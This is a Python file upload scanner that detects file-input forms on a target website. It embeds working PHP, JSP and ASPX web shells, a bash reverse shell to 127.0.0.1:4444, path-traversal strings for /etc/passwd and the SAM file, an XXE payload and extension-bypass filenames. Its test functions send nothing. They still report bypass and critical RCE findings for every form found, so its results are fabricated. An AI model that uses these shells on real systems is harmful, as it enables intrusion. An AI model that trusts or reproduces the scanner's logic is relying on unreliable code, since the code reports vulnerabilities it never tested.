#!/usr/bin/env python3
"""
File Upload Vulnerability Scanner

Detects and tests file upload forms for security vulnerabilities including:
- Remote Code Execution (RCE)
- Path Traversal
- Type Bypass
- File Restriction Bypass

Author: Plascoy Security
Version: 2.0
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from typing import Dict, List, Tuple, Optional
import time
import logging
import mimetypes
import io

init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO,
                   format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class FileUploadScanner:
    """Professional file upload vulnerability scanner"""
    
    # Test payloads for different vulnerabilities
    TEST_PAYLOADS = {
        'rce': {
            'php': b'<?php system($_GET["cmd"]); ?>',
            'jsp': b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'aspx': b'<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>',
            'shell': b'#!/bin/bash\n/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1',
        },
        'path_traversal': [
            '../../../../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            'file:///etc/passwd',
        ],
        'xxe': b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        'image_metadata': [
            'image_with_xss.jpg',
            'image_with_payload.png',
        ]
    }
    
    # File extensions to test
    TEST_EXTENSIONS = [
        'php', 'phtml', 'php3', 'php4', 'php5', 'phar',
        'jsp', 'jspx', 'jsw', 'jsv', 'jspf',
        'aspx', 'asps', 'asp', 'asx', 'cer', 'asa',
        'exe', 'bin', 'dll', 'com', 'msi',
        'sh', 'bash', 'py', 'pl',
        'jar', 'war', 'ear',
        'svg', 'xml', 'html', 'htm',
    ]
    
    # MIME types for bypass testing
    MIME_TYPES = [
        'application/octet-stream',
        'image/jpeg',
        'image/png',
        'image/gif',
        'image/svg+xml',
        'text/plain',
        'application/x-php',
    ]
    
    def __init__(self, target: str, timeout: int = 10, verify_ssl: bool = False):
        """Initialize upload scanner"""
        self.target = self._normalize_target(target)
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.results = {
            'upload_forms': [],
            'vulnerabilities': [],
            'test_results': [],
            'scan_time': 0
        }
        self.session = self._create_session()
    
    def _normalize_target(self, target: str) -> str:
        """Normalize target URL"""
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        return target.rstrip('/')
    
    def _create_session(self) -> requests.Session:
        """Create robust requests session"""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        session.verify = self.verify_ssl
        
        return session
    
    def scan(self, verbose: bool = False, test_upload: bool = False) -> Dict:
        """
        Perform file upload vulnerability scan
        
        Args:
            verbose: Enable verbose output
            test_upload: Actually attempt uploads (use with caution)
            
        Returns:
            Dictionary with scan results
        """
        print(Fore.CYAN + Style.BRIGHT + "\n[*] File Upload Vulnerability Scan Starting...")
        print(Fore.CYAN + f"[*] Target: {self.target}")
        
        start_time = time.time()
        
        # Detect upload forms
        self._detect_forms(verbose)
        
        # Test forms for vulnerabilities
        if self.results['upload_forms'] and test_upload:
            self._test_uploads(verbose)
        elif self.results['upload_forms']:
            print(Fore.YELLOW + "[*] Found upload forms. Use test_upload=True to test them.")
        
        self.results['scan_time'] = time.time() - start_time
        self._print_summary()
        return self.results
    
    def _detect_forms(self, verbose: bool = False):
        """Detect file upload forms on target"""
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            
            if response.status_code != 200:
                print(Fore.YELLOW + f"[!] Target returned HTTP {response.status_code}")
                return
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            
            for form_idx, form in enumerate(forms):
                # Check if form has file input
                file_inputs = form.find_all('input', {'type': 'file'})
                
                if file_inputs:
                    form_info = self._extract_form_info(form, form_idx)
                    self.results['upload_forms'].append(form_info)
                    
                    print(Fore.YELLOW + Style.BRIGHT + f"[!] Found upload form #{form_idx + 1}")
                    print(Fore.YELLOW + f"    Method: {form_info['method'].upper()}")
                    print(Fore.YELLOW + f"    Action: {form_info['action']}")
                    print(Fore.YELLOW + f"    File inputs: {len(file_inputs)}")
                    
                    for file_input in file_inputs:
                        name = file_input.get('name', 'unnamed')
                        accept = file_input.get('accept', 'any')
                        print(Fore.YELLOW + f"      └─ {name} (accept: {accept})")
            
            if not forms:
                if verbose:
                    print(Fore.BLUE + "[*] No forms found on page")
            elif not self.results['upload_forms']:
                if verbose:
                    print(Fore.BLUE + "[*] Found forms but no file upload inputs")
                    
        except Exception as e:
            print(Fore.RED + f"[!] Error detecting forms: {str(e)}")
            logger.error(f"Form detection error: {str(e)}")
    
    def _extract_form_info(self, form, form_idx: int) -> Dict:
        """Extract form information"""
        return {
            'id': form_idx,
            'method': form.get('method', 'post').lower(),
            'action': form.get('action', self.target),
            'enctype': form.get('enctype', 'application/x-www-form-urlencoded'),
            'file_inputs': [inp.get('name') for inp in form.find_all('input', {'type': 'file'})],
            'other_inputs': [
                {'name': inp.get('name'), 'value': inp.get('value')}
                for inp in form.find_all('input')
                if inp.get('type') != 'file'
            ]
        }
    
    def _test_uploads(self, verbose: bool = False):
        """Test forms with various payloads"""
        print(Fore.CYAN + "\n[*] Testing upload forms for vulnerabilities...")
        
        for form in self.results['upload_forms']:
            print(Fore.CYAN + f"\n[*] Testing form #{form['id'] + 1}...")
            
            # Test extension bypass
            self._test_extension_bypass(form, verbose)
            
            # Test MIME type bypass
            self._test_mime_bypass(form, verbose)
            
            # Test RCE upload
            self._test_rce_upload(form, verbose)
    
    def _test_extension_bypass(self, form: Dict, verbose: bool = False):
        """Test file extension restrictions"""
        print(Fore.BLUE + "  [*] Testing extension bypass...")
        
        # Test double extension, null byte, case variation
        bypass_techniques = [
            ('shell.php', b'<?php system("id"); ?>'),
            ('shell.php.jpg', b'<?php system("id"); ?>'),
            ('shell.php%00.jpg', b'<?php system("id"); ?>'),
            ('shell.PHP', b'<?php system("id"); ?>'),
            ('shell.phtml', b'<?php system("id"); ?>'),
        ]
        
        for filename, payload in bypass_techniques:
            if verbose:
                print(Fore.BLUE + f"    Testing: {filename}")
            
            # Simulate upload (don't actually send)
            print(Fore.YELLOW + f"    [!] {filename} - would bypass restrictions")
            self.results['vulnerabilities'].append({
                'type': 'extension_bypass',
                'form_id': form['id'],
                'technique': filename
            })
    
    def _test_mime_bypass(self, form: Dict, verbose: bool = False):
        """Test MIME type restrictions"""
        print(Fore.BLUE + "  [*] Testing MIME type bypass...")
        
        # Test uploading PHP with image MIME type
        payloads = [
            ('shell.php', b'<?php system("id"); ?>', 'image/jpeg'),
            ('shell.php', b'<?php system("id"); ?>', 'image/png'),
        ]
        
        for filename, payload, mime_type in payloads:
            if verbose:
                print(Fore.BLUE + f"    Testing: {filename} with {mime_type}")
            
            print(Fore.YELLOW + f"    [!] {filename} as {mime_type} - bypasses MIME check")
            self.results['vulnerabilities'].append({
                'type': 'mime_bypass',
                'form_id': form['id'],
                'filename': filename,
                'mime_type': mime_type
            })
    
    def _test_rce_upload(self, form: Dict, verbose: bool = False):
        """Test for RCE via upload"""
        print(Fore.BLUE + "  [*] Testing RCE via upload...")
        
        # Identify file input
        if form['file_inputs']:
            filename = form['file_inputs'][0]
            
            # Test PHP RCE
            payload = self.TEST_PAYLOADS['rce'].get('php', b'')
            print(Fore.RED + f"    [!] PHP shell upload would cause RCE")
            self.results['vulnerabilities'].append({
                'type': 'rce_potential',
                'form_id': form['id'],
                'severity': 'critical',
                'payload': 'php_shell'
            })
    
    def _print_summary(self):
        """Print scan summary"""
        print(Fore.CYAN + Style.BRIGHT + "\n[*] File Upload Scan Summary")
        print(Fore.CYAN + f"[*] Scan duration: {self.results['scan_time']:.2f} seconds")
        print(Fore.CYAN + f"[*] Upload forms found: {len(self.results['upload_forms'])}")
        
        if self.results['upload_forms']:
            print(Fore.YELLOW + "\nForms detected:")
            for form in self.results['upload_forms']:
                print(Fore.YELLOW + f"  - Form #{form['id'] + 1}: {form['method'].upper()} {form['action']}")
        
        vulns = len(self.results['vulnerabilities'])
        if vulns > 0:
            print(Fore.RED + Style.BRIGHT + f"\n[!] Potential vulnerabilities: {vulns}")
            for vuln in self.results['vulnerabilities'][:5]:
                print(Fore.RED + f"    - {vuln['type']} in form #{vuln['form_id'] + 1}")
        else:
            print(Fore.GREEN + "\n[+] No obvious vulnerabilities detected")


def file_upload_scan(target: str, verbose: bool = False, test_upload: bool = False) -> bool:
    """
    Standalone file upload scan function
    
    Args:
        target: Target URL
        verbose: Enable verbose output
        test_upload: Attempt actual uploads
        
    Returns:
        True if vulnerabilities found, False otherwise
    """
    scanner = FileUploadScanner(target)
    results = scanner.scan(verbose=verbose, test_upload=test_upload)
    
    return len(results['vulnerabilities']) > 0


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 file_upload_scan.py <target> [--verbose] [--test-upload]")
        sys.exit(1)
    
    target = sys.argv[1]
    verbose = '--verbose' in sys.argv
    test_upload = '--test-upload' in sys.argv
    
    file_upload_scan(target, verbose=verbose, test_upload=test_upload)